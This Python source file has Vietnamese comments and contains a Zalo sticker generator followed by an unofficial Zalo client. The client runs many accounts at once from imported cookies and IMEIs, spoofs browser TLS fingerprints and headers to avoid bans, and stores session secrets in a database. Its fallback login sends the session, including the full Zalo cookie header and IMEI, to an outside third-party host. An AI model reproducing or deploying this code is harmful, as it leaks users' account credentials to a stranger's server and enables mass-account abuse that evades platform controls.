                        if timescale > 0:
                            return round(float(duration) / float(timescale), 3)
            except Exception:
                pass
            return 0.0
        finally:
            if tmp_path and os.path.exists(tmp_path):
                try:
                    os.remove(tmp_path)
                except Exception:
                    pass

    @classmethod
    def _apply_diecut_sticker_treatment(cls, im_rgba, add_border=True):
        """Biến ảnh bất kỳ thành Nhãn Dán Die-Cut chuẩn Zalo 512×512 nền trong suốt (Cắt Khung & Tách Nền Chuẩn Nhãn Dán):
        1. Cắt bỏ viền thừa ngoài rìa (Auto-Crop Border) và chuẩn hóa kích thước xử lý nhanh.
        2. Nếu ảnh có nền đồng màu ở rìa/góc: Thực hiện thuật toán BFS Flood-Fill từ 4 cạnh biên vào trong để tách sạch nền
           xung quanh chủ thể và làm mịn biên alpha (Feathering).
        3. Nếu là ảnh chụp toàn cảnh: Cắt khung Sticker bo góc Die-Cut mềm mại kết hợp viền trắng nổi 3D (Stroke 8px) + bóng đổ mềm
           trên khung nền trong suốt RGBA(0, 0, 0, 0) 512×512 để khi gửi lên Zalo nhảy ra đúng chuẩn Nhãn Dán!"""
        from PIL import Image, ImageDraw, ImageFilter, ImageEnhance

        im = im_rgba.convert("RGBA")
        # Chuẩn hóa kích thước làm việc để thuật toán tách nền chạy trong < 0.05s
        w0, h0 = im.size
        if max(w0, h0) > 512:
            sc0 = 512.0 / float(max(w0, h0))
            im = im.resize((max(1, int(w0 * sc0)), max(1, int(h0 * sc0))), Image.Resampling.LANCZOS)
        w, h = im.size

        alpha_extrema = im.getchannel("A").getextrema()
        has_transparency = bool(alpha_extrema and alpha_extrema[0] < 210)

        if not has_transparency and w >= 16 and h >= 16:
            px = im.load()
            border_samples = [
                px[0, 0], px[w - 1, 0], px[0, h - 1], px[w - 1, h - 1],
                px[w // 2, 0], px[w // 2, h - 1], px[0, h // 2], px[w - 1, h // 2]
            ]
            avg_r = sum(c[0] for c in border_samples) // len(border_samples)
            avg_g = sum(c[1] for c in border_samples) // len(border_samples)
            avg_b = sum(c[2] for c in border_samples) // len(border_samples)
            corner_spread = sum(
                1 for c in border_samples
                if (abs(c[0] - avg_r) + abs(c[1] - avg_g) + abs(c[2] - avg_b)) <= 65
            )
            if corner_spread >= 5:
                # Thuật toán BFS Flood-Fill từ 4 viền ngoài để tách nền tự động giữ nguyên chủ thể ở giữa
                tol = 54
                visited = bytearray(w * h)
                q = deque()
                for x in range(w):
                    for y in (0, h - 1):
                        c = px[x, y]
                        if abs(c[0] - avg_r) + abs(c[1] - avg_g) + abs(c[2] - avg_b) <= tol:
                            idx = y * w + x
                            visited[idx] = 1
                            q.append((x, y))
                for y in range(1, h - 1):
                    for x in (0, w - 1):
                        c = px[x, y]
                        if abs(c[0] - avg_r) + abs(c[1] - avg_g) + abs(c[2] - avg_b) <= tol:
                            idx = y * w + x
                            if not visited[idx]:
                                visited[idx] = 1
                                q.append((x, y))
                removed_cnt = 0
                max_remove = int(w * h * 0.82)
                while q and removed_cnt < max_remove:
                    cx, cy = q.popleft()
                    removed_cnt += 1
                    for nx, ny in ((cx - 1, cy), (cx + 1, cy), (cx, cy - 1), (cx, cy + 1)):
                        if 0 <= nx < w and 0 <= ny < h:
                            nidx = ny * w + nx
                            if not visited[nidx]:
                                nc = px[nx, ny]
                                if abs(nc[0] - avg_r) + abs(nc[1] - avg_g) + abs(nc[2] - avg_b) <= tol:
                                    visited[nidx] = 1
                                    q.append((nx, ny))
                # Nếu tách được vùng nền hợp lý (5% .. 80% diện tích ảnh), áp dụng mặt nạ tách nền chủ thể
                if int(w * h * 0.04) <= removed_cnt <= int(w * h * 0.80):
                    alpha_bytes = bytearray(255 if not visited[i] else 0 for i in range(w * h))
                    alpha_mask = Image.frombytes("L", (w, h), bytes(alpha_bytes))
                    alpha_mask = alpha_mask.filter(ImageFilter.MedianFilter(3)).filter(ImageFilter.GaussianBlur(0.8))
                    im.putalpha(alpha_mask)
                    bbox_fg = alpha_mask.getbbox()
                    if bbox_fg and (bbox_fg[2] - bbox_fg[0] >= 24) and (bbox_fg[3] - bbox_fg[1] >= 24):
                        im = im.crop(bbox_fg)
                        w, h = im.size
                    has_transparency = True

        if not has_transparency:
            # Cắt khung chuẩn Nhãn Dán Die-Cut bo góc mượt (tự động căn khung cân đối)
            mask_rounded = Image.new("L", (w, h), 0)
            dr_m = ImageDraw.Draw(mask_rounded)
            rad = max(32, int(min(w, h) * 0.16))
            pad_in = max(2, int(min(w, h) * 0.015))
            dr_m.rounded_rectangle([(pad_in, pad_in), (w - pad_in - 1, h - pad_in - 1)], radius=rad, fill=255)
            im.putalpha(mask_rounded)

        # Căn kích thước 448×448 trong khung 512×512 để dành 32px cho viền Die-Cut trắng & bóng đổ
        target_box = 452 if add_border else 496
        scale = min(float(target_box) / max(1, w), float(target_box) / max(1, h))
        nw = max(1, min(target_box, int(round(w * scale))))
        nh = max(1, min(target_box, int(round(h * scale))))
        im_resized = im.resize((nw, nh), Image.Resampling.LANCZOS)

        try:
            im_resized = im_resized.filter(ImageFilter.UnsharpMask(radius=1.2, percent=135, threshold=2))
            im_resized = ImageEnhance.Sharpness(im_resized).enhance(1.28)
            im_resized = ImageEnhance.Contrast(im_resized).enhance(1.05)
        except Exception:
            pass

        canvas = Image.new("RGBA", (512, 512), (0, 0, 0, 0))
        ox = (512 - nw) // 2
        oy = (512 - nh) // 2

        if add_border:
            try:
                alpha_ch = im_resized.getchannel("A")
                # Tạo bóng đổ mềm phía dưới
                shadow_mask = alpha_ch.filter(ImageFilter.MaxFilter(11)).filter(ImageFilter.GaussianBlur(6))
                shadow_layer = Image.new("RGBA", (nw, nh), (0, 0, 0, 110))
                shadow_layer.putalpha(shadow_mask)
                canvas.paste(shadow_layer, (ox, min(512 - nh, oy + 6)), shadow_layer)

                # Tạo viền trắng Die-Cut Sticker dày 7px quanh chủ thể
                stroke_mask = alpha_ch.filter(ImageFilter.MaxFilter(13)).filter(ImageFilter.Smooth())
                stroke_layer = Image.new("RGBA", (nw, nh), (255, 255, 255, 255))
                stroke_layer.putalpha(stroke_mask)
                canvas.paste(stroke_layer, (ox, oy), stroke_layer)
            except Exception:
                pass

        canvas.paste(im_resized, (ox, oy), im_resized)
        return canvas

    @classmethod
    def create_sharp_image_sticker(cls, image_bytes_or_path, output_dir=None, add_diecut_border=True):
        """Tạo Sticker Ảnh Sắc Nét 512×512 (WebP trong suốt + GIF trong suốt + PNG) chuẩn Nhãn Dán Zalo & Telegram."""
        out_dir = output_dir or UPLOAD_DIR
        os.makedirs(out_dir, exist_ok=True)
        try:
            from PIL import Image
            if isinstance(image_bytes_or_path, (bytes, bytearray)):
                raw_bytes_in = bytes(image_bytes_or_path)
            else:
                raw_bytes_in, err_f = cls.fetch_media_from_url_or_path(image_bytes_or_path)
                if not raw_bytes_in:
                    return {"ok": False, "error": f"❌ {err_f}"}

            im_open = Image.open(io.BytesIO(raw_bytes_in))
            # Nếu là ảnh GIF động hoặc WebP động nhiều frame -> giữ nguyên chuyển động!
            if getattr(im_open, "is_animated", False) and getattr(im_open, "n_frames", 1) > 1:
                return cls.create_short_video_sticker(raw_bytes_in, declared_duration=2.5, output_dir=out_dir)

            canvas = cls._apply_diecut_sticker_treatment(im_open.convert("RGBA"), add_border=add_diecut_border)

            ts_tag = f"{int(time.time() * 1000)}_{secrets.token_hex(2)}"
            png_path = os.path.join(out_dir, f"sticker_sharp_{ts_tag}.png")
            webp_path = os.path.join(out_dir, f"sticker_sharp_{ts_tag}.webp")
            gif_path = os.path.join(out_dir, f"sticker_sharp_{ts_tag}.gif")

            canvas.save(png_path, format="PNG", optimize=True)
            try:
                canvas.save(webp_path, format="WEBP", quality=98, lossless=True)
            except Exception:
                webp_path = png_path

            # Xuất thêm bản GIF trong suốt để tương thích với cả cổng /api/group/gif của Zalo
            try:
                alpha = canvas.getchannel("A")
                pal_im = canvas.convert("RGB").convert("P", palette=Image.Palette.ADAPTIVE, colors=255)
                mask = Image.eval(alpha, lambda a: 255 if a <= 128 else 0)
                pal_im.paste(255, mask)
                pal_im.save(gif_path, format="GIF", transparency=255, disposal=2)
            except Exception:
                gif_path = png_path

            with open(png_path, "rb") as rf:
                png_bytes = rf.read()
            with open(webp_path, "rb") as rf:
                webp_bytes = rf.read()
            with open(gif_path, "rb") as rf:
                gif_bytes = rf.read()

            return {
                "ok": True,
                "type": "image_sticker",
                "png_path": png_path,
                "webp_path": webp_path,
                "gif_path": gif_path,
                "png_bytes": png_bytes,
                "webp_bytes": webp_bytes,
                "gif_bytes": gif_bytes,
                "width": 512,
                "height": 512,
                "message": "✅ Đã tạo Nhãn Dán Sticker 512×512 Chuẩn Zalo thành công!",
            }
        except Exception as e:
            return {
                "ok": False,
                "error": f"❌ Không thể tạo Sticker từ ảnh: {e}",
            }

    @classmethod
    def create_text_sticker_512(cls, text_str, output_dir=None):
        """Tạo Nhãn Dán Chữ Nghệ Thuật Die-Cut 512×512 trên nền trong suốt 100% (RGBA 0,0,0,0) chuẩn Sticker Zalo."""
        from PIL import Image, ImageDraw, ImageFilter
        clean_t = str(text_str or "STICKER VIP").strip()[:60]
        canvas = Image.new("RGBA", (512, 512), (0, 0, 0, 0))
        dr = ImageDraw.Draw(canvas)

        # Vẽ huy hiệu đám mây / khiên Sticker ở trung tâm trên nền hoàn toàn trong suốt
        palettes = [
            ((255, 59, 48, 255), (255, 149, 0, 255), (255, 230, 0, 255)),
            ((0, 122, 255, 255), (88, 86, 214, 255), (0, 245, 212, 255)),
            ((175, 82, 222, 255), (255, 45, 85, 255), (255, 204, 0, 255)),
            ((21, 168, 95, 255), (0, 199, 190, 255), (255, 214, 10, 255)),
        ]
        c_main, c_sub, c_acc = palettes[hash(clean_t) % len(palettes)]

        # Đổ bóng mềm
        shadow = Image.new("RGBA", (512, 512), (0, 0, 0, 0))
        dr_s = ImageDraw.Draw(shadow)
        dr_s.rounded_rectangle([(38, 96), (474, 432)], radius=88, fill=(0, 0, 0, 125))
        shadow = shadow.filter(ImageFilter.GaussianBlur(10))
        canvas.alpha_composite(shadow)

        # Viền Die-Cut trắng ngoài cùng dày 14px + thân Sticker
        dr.rounded_rectangle([(28, 82), (484, 418)], radius=92, fill=(255, 255, 255, 255))
        dr.rounded_rectangle([(42, 96), (470, 404)], radius=78, fill=c_main, outline=c_acc, width=6)
        dr.rounded_rectangle([(54, 108), (458, 240)], radius=64, fill=c_sub)

        # Tự động ngắt dòng & chọn cỡ chữ lớn dễ đọc
        words = clean_t.split()
        lines = []
        cur_ln = ""
        max_chars = 11 if len(clean_t) <= 22 else 14
        for w in words:
            if not cur_ln:
                cur_ln = w
            elif len(cur_ln) + 1 + len(w) <= max_chars:
                cur_ln += " " + w
            else:
                lines.append(cur_ln)
                cur_ln = w
        if cur_ln:
            lines.append(cur_ln)
        lines = lines[:3]

        font_sz = 64 if len(lines) == 1 and len(clean_t) <= 10 else (50 if len(lines) <= 2 else 42)
        font_obj = cls._load_font(size=font_sz)

        total_h = len(lines) * (font_sz + 12)
        start_y = 250 - (total_h // 2)
        for idx_l, ln_txt in enumerate(lines):
            y_pos = start_y + idx_l * (font_sz + 12)
            try:
                bbox = dr.textbbox((0, 0), ln_txt, font=font_obj)
                tw = bbox[2] - bbox[0]
            except Exception:
                tw = len(ln_txt) * (font_sz // 2)
            x_pos = max(56, (512 - tw) // 2)
            # Viền chữ đen đậm + chữ trắng sáng nổi bật
            for dx in (-3, 0, 3):
                for dy in (-3, 0, 3):
                    if dx or dy:
                        dr.text((x_pos + dx, y_pos + dy), ln_txt, font=font_obj, fill=(18, 20, 32, 255))
            dr.text((x_pos, y_pos), ln_txt, font=font_obj, fill=(255, 255, 255, 255))

        buf = io.BytesIO()
        canvas.save(buf, format="PNG")
        return cls.create_sharp_image_sticker(buf.getvalue(), output_dir=output_dir, add_diecut_border=False)

    @classmethod
    def create_short_video_sticker(cls, video_bytes_or_path, declared_duration=None, output_dir=None):
        """Tạo Nhãn Dán Động Bằng Video Ngắn (≤ 3.0 Giây). Nếu > 3.0s thì TỪ CHỐI NGAY LẬP TỨC!"""
        out_dir = output_dir or UPLOAD_DIR
        os.makedirs(out_dir, exist_ok=True)
        tmp_in = None
        try:
            import tempfile
            if isinstance(video_bytes_or_path, (bytes, bytearray)):
                fd, tmp_in = tempfile.mkstemp(suffix=".mp4")
                os.close(fd)
                with open(tmp_in, "wb") as wf:
                    wf.write(video_bytes_or_path)
                in_path = tmp_in
            else:
                s_src = str(video_bytes_or_path).strip()
                if s_src.startswith(("http://", "https://")):
                    raw_v, err_v = cls.fetch_media_from_url_or_path(s_src)
                    if not raw_v:
                        return {"ok": False, "error": f"❌ {err_v}"}
                    fd, tmp_in = tempfile.mkstemp(suffix=".mp4")
                    os.close(fd)
                    with open(tmp_in, "wb") as wf:
                        wf.write(raw_v)
                    in_path = tmp_in
                else:
                    in_path = s_src

            measured_dur = cls.get_video_duration_seconds(in_path)
            eff_dur = float(declared_duration) if (declared_duration is not None and float(declared_duration) > measured_dur) else measured_dur

            if eff_dur > cls.MAX_VIDEO_STICKER_DURATION_SEC:
                return {
                    "ok": False,
                    "rejected_over_3s": True,
                    "duration": round(eff_dur, 2),
                    "error": (
                        f"❌ TỪ CHỐI TẠO NHÃN DÁN VIDEO: Video của bạn dài {eff_dur:.2f} giây "
                        f"(Vượt quá giới hạn tối đa {cls.MAX_VIDEO_STICKER_DURATION_SEC:.0f} giây)!\\n"
                        f"👉 Chỉ nhận tạo nhãn dán bằng video ngắn dưới 3 giây (≤ 3.0s)."
                    ),
                }

            ts_tag = f"{int(time.time() * 1000)}_{secrets.token_hex(2)}"
            gif_path = os.path.join(out_dir, f"sticker_anim_{ts_tag}.gif")
            webp_path = os.path.join(out_dir, f"sticker_anim_{ts_tag}.webp")
            import subprocess
            subprocess.run(
                [
                    "ffmpeg", "-y", "-i", in_path,
                    "-t", "3.0",
                    "-vf", "fps=16,scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=0x00000000",
                    "-loop", "0",
                    gif_path
                ],
                capture_output=True, timeout=18
            )
            try:
                subprocess.run(
                    [
                        "ffmpeg", "-y", "-i", in_path,
                        "-t", "3.0",
                        "-vcodec", "libwebp", "-lossless", "0", "-q:v", "88",
                        "-vf", "fps=16,scale=512:512:force_original_aspect_ratio=decrease,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=0x00000000",
                        "-loop", "0", "-an",
                        webp_path
                    ],
                    capture_output=True, timeout=18
                )
            except Exception:
                pass

            out_file = gif_path if os.path.exists(gif_path) else in_path
            with open(out_file, "rb") as rf:
                anim_bytes = rf.read()
            webp_bytes = anim_bytes
            if os.path.exists(webp_path):
                with open(webp_path, "rb") as rf:
                    webp_bytes = rf.read()

            return {
                "ok": True,
                "type": "video_sticker",
                "duration": round(eff_dur if eff_dur > 0 else 2.5, 2),
                "gif_path": gif_path if os.path.exists(gif_path) else out_file,
                "webp_path": webp_path if os.path.exists(webp_path) else out_file,
                "anim_bytes": anim_bytes,
                "gif_bytes": anim_bytes,
                "webp_bytes": webp_bytes,
                "width": 512,
                "height": 512,
                "message": f"✅ Đã tạo Nhãn Dán Động ({eff_dur if eff_dur > 0 else 2.5:.2f}s ≤ 3.0s) Chuẩn 512×512 Sắc Nét!",
            }
        except Exception as e:
            return {
                "ok": False,
                "error": f"❌ Lỗi xử lý Video Sticker: {e}",
            }
        finally:
            if tmp_in and os.path.exists(tmp_in):
                try:
                    os.remove(tmp_in)
                except Exception:
                    pass


class Zalo:
    _CLIENT_POOL = {}
    _GROUPS_CACHE = {}
    _FRIENDS_CACHE = {}
    _POOL_LOCK = threading.RLock()
    _IMEI_LOCKS = {}

    @classmethod
    def _get_imei_lock(cls, imei_str):
        with cls._POOL_LOCK:
            lk = cls._IMEI_LOCKS.get(imei_str)
            if lk is None:
                lk = threading.RLock()
                cls._IMEI_LOCKS[imei_str] = lk
            return lk

    @classmethod
    def get_pooled_client(cls, imei, cookies, force_new=False, user_agent="", zpw_enk_hint="", uid_hint=""):
        """Hồ quản lý phiên Zalo tập trung (ZaloSessionPool):
        - Khóa chặt cặp (IMEI, Cookie, User-Agent, zpw_enk) kèm khóa đồng bộ theo từng IMEI (_IMEI_LOCKS)
          để chạy 10-50 Acc Zalo cùng lúc không bao giờ gọi trùng getLoginInfo làm die Cookie/IMEI!"""
        c_dict = normalize_zalo_cookies(cookies)
        imei_str = extract_imei_from_raw_input(imei, cookies)
        c_hash = hashlib.md5(json.dumps(c_dict, sort_keys=True).encode("utf-8")).hexdigest()[:12]
        pkey = f"{imei_str}_{c_hash}"
        now = time.time()
        with cls._POOL_LOCK:
            if not force_new and pkey in cls._CLIENT_POOL:
                entry = cls._CLIENT_POOL[pkey]
                if now - entry["ts"] < 3600.0 and entry["client"].secret_key:
                    if uid_hint and not entry["client"].uid:
                        entry["client"].uid = str(uid_hint)
                        OWNER_UIDS_CACHE.add(str(uid_hint))
                    return entry["client"]
            if not force_new and imei_str:
                for k_ex, ent_ex in cls._CLIENT_POOL.items():
                    if k_ex.startswith(f"{imei_str}_") and (now - ent_ex["ts"] < 3600.0) and ent_ex["client"].secret_key:
                        ex_ck = ent_ex["client"].cookies_dict
                        if (c_dict.get("zpw_sek") and ex_ck.get("zpw_sek") == c_dict.get("zpw_sek")) or (not c_dict.get("zpw_sek") and c_dict.get("zpsid") and ex_ck.get("zpsid") == c_dict.get("zpsid")):
                            return ent_ex["client"]

        imei_lk = cls._get_imei_lock(imei_str or pkey)
        with imei_lk:
            with cls._POOL_LOCK:
                if not force_new and pkey in cls._CLIENT_POOL:
                    entry = cls._CLIENT_POOL[pkey]
                    if now - entry["ts"] < 3600.0 and entry["client"].secret_key:
                        return entry["client"]
            client = cls(imei_str, c_dict, user_agent=user_agent, zpw_enk_hint=zpw_enk_hint, uid_hint=uid_hint)
            with cls._POOL_LOCK:
                cls._CLIENT_POOL[pkey] = {"ts": time.time(), "client": client}
            return client

    def __init__(self, imei, cookies, user_agent="", zpw_enk_hint="", uid_hint=""):
        self.imei = extract_imei_from_raw_input(imei, cookies)
        self.cookies_dict = normalize_zalo_cookies(cookies)
        self._working_recent_ep = None
        self.s = requests.Session()
        self.prio_s = requests.Session()
        try:
            tls_ad = Chrome131TLSAdapter(pool_connections=512, pool_maxsize=1024, max_retries=0)
            prio_ad = Chrome131TLSAdapter(pool_connections=64, pool_maxsize=128, max_retries=0)
            self.s.mount("https://", tls_ad)
            self.prio_s.mount("https://", prio_ad)
        except Exception:
            adapter = HTTPAdapter(pool_connections=512, pool_maxsize=1024, max_retries=0)
            self.s.mount("https://", adapter)
            self.prio_s.mount("https://", HTTPAdapter(pool_connections=64, pool_maxsize=128, max_retries=0))
        self.s.mount("http://", HTTPAdapter(pool_connections=256, pool_maxsize=512, max_retries=0))
        self.prio_s.mount("http://", HTTPAdapter(pool_connections=64, pool_maxsize=128, max_retries=0))
        self._gw_step = 0
        self._cached_key_str = None
        self._cached_key_bytes = None
        base_hdrs = ZaloSmartAntiBanEngine.get_session_headers(self.imei)
        # Tìm User-Agent và zpw_enk đã lưu trong Vault/DB nếu chưa truyền vào
        saved_ua, saved_enk, saved_uid, saved_name = self._lookup_saved_vault_meta()
        eff_ua = (user_agent or saved_ua or "").strip()
        if eff_ua:
            base_hdrs["User-Agent"] = eff_ua
        self.user_agent = base_hdrs["User-Agent"]
        self.s.headers.update(base_hdrs)
        self.prio_s.headers.update(base_hdrs)
        if self.imei:
            self.cookies_dict["z_uuid"] = self.imei
        self.cookies_dict.setdefault("_zlang", "vn")
        self._sync_cookie_headers()
        self.secret_key = (zpw_enk_hint or saved_enk or "").strip() or None
        raw_uid_cand = str(uid_hint or saved_uid or "").strip()
        if not raw_uid_cand.isdigit() or len(raw_uid_cand) < 6 or raw_uid_cand == str(self.imei or ""):
            raw_uid_cand = ""
        # Không trích xuất nhầm timestamp của cookie làm UID giả
        self.uid = raw_uid_cand or None
        self.send2me_id = self.uid
        self.display_name = saved_name or None
        self.zalo_name = saved_name or None
        self.username = saved_name or None
        self.ws_urls = [
            "wss://ws1.chat.zalo.me",
            "wss://ws2.chat.zalo.me",
            "wss://ws3.chat.zalo.me",
            "wss://ws4.chat.zalo.me",
        ]
        if self.secret_key and self.uid:
            OWNER_UIDS_CACHE.add(self.uid)
            if not self.display_name:
                self.display_name = f"Zalo_{self.uid[-4:]}"
        elif self.secret_key and not self.uid:
            try:
                r_ui = self.s.get("https://jr.chat.zalo.me/jr/userinfo", headers={"Referer": "https://chat.zalo.me/"}, timeout=3.5)
                j_ui = r_ui.json() if r_ui.content else {}
                info_ui = (j_ui.get("data") or {}).get("info") or {}
                uid_ui = str(info_ui.get("uid") or info_ui.get("id") or "").strip()
                if uid_ui and uid_ui.isdigit():
                    self.uid = uid_ui
                    self.send2me_id = uid_ui
                    self.display_name = info_ui.get("name") or info_ui.get("display_name") or self.display_name or f"Zalo_{uid_ui[-4:]}"
                    OWNER_UIDS_CACHE.add(uid_ui)
            except Exception:
                pass
            if not self.uid:
                try:
                    self._login()
                except Exception:
                    pass
        else:
            try:
                self._login()
            except Exception:
                pass

    def _sync_cookie_headers(self):
        try:
            if self.imei:
                self.cookies_dict["z_uuid"] = self.imei
            self.cookies_dict.setdefault("_zlang", "vn")
            self.s.cookies.update(self.cookies_dict)
            self.prio_s.cookies.update(self.cookies_dict)
            ck_str = "; ".join(f"{k}={v}" for k, v in self.cookies_dict.items() if k and v is not None and str(v).strip())
            if ck_str:
                self.s.headers["Cookie"] = ck_str
                self.prio_s.headers["Cookie"] = ck_str
        except Exception:
            pass

    def _lookup_saved_vault_meta(self):
        ua, enk, uid, dname = "", "", "", ""
        try:
            conn = db()
            row = conn.execute(
                "SELECT uid, display_name, zpw_enk, user_agent FROM zalo_cookie_vault WHERE imei=? ORDER BY updated_at DESC LIMIT 1",
                (self.imei,)
            ).fetchone()
            if row:
                u_cand = str(row["uid"] or "").strip()
                uid = u_cand if (u_cand.isdigit() and u_cand != str(self.imei or "")) else ""
                dname = str(row["display_name"] or "")
                enk = str(row["zpw_enk"] or "")
                ua = str(row["user_agent"] or "")
            if not enk or not ua or not uid:
                r_acc = conn.execute(
                    "SELECT uid, name, zpw_enk, user_agent FROM accounts WHERE platform='zalo' AND imei=? ORDER BY id DESC LIMIT 1",
                    (self.imei,)
                ).fetchone()
                if r_acc:
                    u_acc = str(r_acc["uid"] or "").strip()
                    if not uid and u_acc.isdigit() and u_acc != str(self.imei or ""):
                        uid = u_acc
                    dname = dname or str(r_acc["name"] or "")
                    enk = enk or str(r_acc["zpw_enk"] or "")
                    ua = ua or str(r_acc["user_agent"] or "")
        except Exception:
            pass
        return ua, enk, uid, dname

    def _login(self, force=False):
        """Đăng nhập APIZalo (zca-js / zlapi chuẩn v645) giữ sống Cookie & IMEI cố định 100%:
        - Khóa đồng bộ theo từng IMEI (_get_imei_lock) kèm Cooldown 15s để khi chạy đa luồng/đa nhóm
          tuyệt đối không gọi trùng getLoginInfo làm văng phiên!"""
        imei_lk = self._get_imei_lock(self.imei or "default")
        with imei_lk:
            now_lg = time.time()
            if not force and self.secret_key and (now_lg - getattr(self, "_last_login_ok_ts", 0.0) < 15.0):
                return
            self._login_locked()
            if self.secret_key:
                self._last_login_ok_ts = time.time()

    def _login_locked(self):
        self._sync_cookie_headers()
        ud = None
        last_err = ""
        try:
            from zalo_login import exchange_cookies_for_zpw_enk
            sec_ch = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
            sec_plat = '"macOS"' if "Macintosh" in str(self.user_agent or "") else '"Windows"'
            ud_ext = exchange_cookies_for_zpw_enk(
                self.s, self.imei, self.cookies_dict, self.user_agent, sec_ch, sec_plat, {}, computer_name="Web"
            )
            if isinstance(ud_ext, dict) and ud_ext.get("zpw_enk"):
                ud = ud_ext
                self._sync_cookie_headers()
        except Exception as e_ex:
            last_err = str(e_ex)

        ts_now = int(time.time() * 1000)
        if not isinstance(ud, dict):
            for cver_try in (645, 646, 637):
                for zt_try in (30, 24):
                    for comp_try in ("Web", "Zalo PC"):
                        for ep_try in (
                            "https://wpa.chat.zalo.me/api/login/getLoginInfo",
                            "https://tt-wpa.chat.zalo.me/api/login/getLoginInfo",
                            "https://chat.zalo.me/api/login/getLoginInfo",
                        ):
                            try:
                                self._sync_cookie_headers()
                                enc_q, enc_key = ZaloParamsEncryptor.build_encrypted_login_query(
                                    self.imei, computer_name=comp_try, language="vi", ts=ts_now, ztype=zt_try, client_version=cver_try
                                )
                                r_enc = self.s.get(ep_try, params=enc_q, timeout=7)
                                for c_item in r_enc.cookies:
                                    if c_item.name and c_item.value:
                                        self.cookies_dict[c_item.name] = c_item.value
                                self._sync_cookie_headers()
                                d_enc = r_enc.json() if r_enc.content else {}
                                raw_enc_data = d_enc.get("data")
                                if isinstance(raw_enc_data, str) and raw_enc_data:
                                    dec_ud = ZaloParamsEncryptor.decrypt_login_data(raw_enc_data, enc_key)
                                    if isinstance(dec_ud, dict) and dec_ud.get("zpw_enk"):
                                        ud = dec_ud
                                        break
                                elif isinstance(raw_enc_data, dict) and raw_enc_data.get("zpw_enk"):
                                    ud = raw_enc_data
                                    break
                                else:
                                    last_err = d_enc.get("error_message") or str(d_enc.get("error_code") or "")
                            except Exception as e_enc:
                                last_err = str(e_enc)
                        if isinstance(ud, dict) and ud.get("zpw_enk"):
                            break
                    if isinstance(ud, dict) and ud.get("zpw_enk"):
                        break
                if isinstance(ud, dict) and ud.get("zpw_enk"):
                    break

        if not isinstance(ud, dict) or not ud.get("zpw_enk"):
            try:
                self._sync_cookie_headers()
                r_fb = self.s.get("https://lengocanh.vercel.app/zlapi/login", params={"imei": self.imei}, timeout=7)
                j_fb = r_fb.json() if r_fb.content else {}
                if j_fb.get("error_code") == 0 and isinstance(j_fb.get("data"), dict):
                    fb_d = j_fb["data"]
                    s_key = fb_d.get("secret_key") or fb_d.get("zpw_enk")
                    if s_key:
                        ud = {
                            "zpw_enk": s_key,
                            "uid": str(fb_d.get("send2me_id") or fb_d.get("uid") or self.uid or ""),
                            "send2me_id": str(fb_d.get("send2me_id") or self.uid or ""),
                        }
            except Exception:
                pass

        if isinstance(ud, dict) and ud.get("zpw_enk"):
            self.uid = str(ud.get("uid") or ud.get("userId") or ud.get("send2me_id") or self.uid or "")
            self.send2me_id = str(ud.get("send2me_id") or self.uid or "")
            self.secret_key = ud.get("zpw_enk")
            pf = ud.get("profile") if isinstance(ud.get("profile"), dict) else {}
            self.display_name = (
                ud.get("displayName") or ud.get("zaloName")
                or pf.get("displayName") or pf.get("zaloName")
                or self.display_name or (f"Zalo_{self.uid[-4:]}" if self.uid else "Zalo PC")
            )
            self.zalo_name = ud.get("zaloName") or self.display_name
            self.username = ud.get("username") or self.display_name

            ws_candidates = []
            for k in ("zpw_ws", "ws", "websocket"):
                val = ud.get(k)
                if isinstance(val, list):
                    ws_candidates.extend(val)
                elif isinstance(val, str) and val:
                    ws_candidates.append(val)
            if ws_candidates:
                self.ws_urls = ws_candidates

            try:
                ZaloCookieVaultEngine.save_zalo_vault_record(
                    uid=self.uid,
                    display_name=self.display_name,
                    imei=self.imei,
                    cookies_dict=self.cookies_dict,
                    zpw_enk=self.secret_key,
                    user_agent=self.user_agent
                )
                conn = db()
                conn.execute(
                    "UPDATE accounts SET uid=?, zpw_enk=?, user_agent=?, cookies=? WHERE platform='zalo' AND imei=?",
                    (self.uid, self.secret_key, self.user_agent, json.dumps(self.cookies_dict, ensure_ascii=False), self.imei)
                )
                conn.commit()
            except Exception:
                pass
        elif self.secret_key:
            if not self.display_name:
                self.display_name = f"Zalo_{self.uid[-4:]}" if self.uid else "Zalo SG"
        else:
            raise Exception(f"DIE — Thiết bị máy tính đã đăng xuất khỏi tài khoản Zalo hoặc Cookie/IMEI đã hết hạn ({last_err or 'No zpw_enk'})")

        if self.uid:
            OWNER_UIDS_CACHE.add(self.uid)
        if self.send2me_id:
            OWNER_UIDS_CACHE.add(self.send2me_id)

    def _get_aes_key_bytes(self):
        if self._cached_key_bytes is not None and self._cached_key_str == self.secret_key:
            return self._cached_key_bytes
        kb = base64.b64decode(self.secret_key)
        self._cached_key_str = self.secret_key
        self._cached_key_bytes = kb
        return kb

    def _enc(self, params):
        key = self._get_aes_key_bytes()
        cipher = AES.new(key, AES.MODE_CBC, bytes(16))
        pt = json.dumps(params, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
        pad = 16 - (len(pt) & 15)
        pt += bytes([pad]) * pad
        return base64.b64encode(cipher.encrypt(pt)).decode("ascii")

    def _dec(self, enc):
        if not enc:
            return "{}"
        key = self._get_aes_key_bytes()
        cipher = AES.new(key, AES.MODE_CBC, bytes(16))
        raw = base64.b64decode(unquote(enc) if "%" in enc else enc)
        d = cipher.decrypt(raw)
        pad_len = d[-1]
        if 1 <= pad_len <= 16:
            d = d[:-pad_len]
        return d.decode("utf-8", "ignore")

    def get_groups(self, use_cache=True):
        return self.groups(use_cache=use_cache)

    def groups(self, use_cache=True):
        cache_key = str(self.uid or self.imei)
        if use_cache:
            with self._POOL_LOCK:
                c = self._GROUPS_CACHE.get(cache_key)
                if c and (time.time() - c["ts"] < 300.0):
                    return list(c["data"])
        r = self.s.get(
            "https://tt-group-wpa.chat.zalo.me/api/group/getlg/v4",
            params={"zpw_ver": 645, "zpw_type": 30}, timeout=15,
        )
        dec = self._dec(r.json().get("data", ""))
        grid = json.loads(dec).get("data", {}).get("gridVerMap", {})
        all_gids = [
            _clean_zalo_id(g) for g in grid.keys()
            if _clean_zalo_id(g) and _clean_zalo_id(g) != str(self.uid or "")
        ]
        for gid in all_gids:
            if self.uid:
                KNOWN_GROUPS_BY_ACC[self.uid].add(gid)
            ALL_KNOWN_ZALO_GROUP_IDS.add(gid)

        out = []
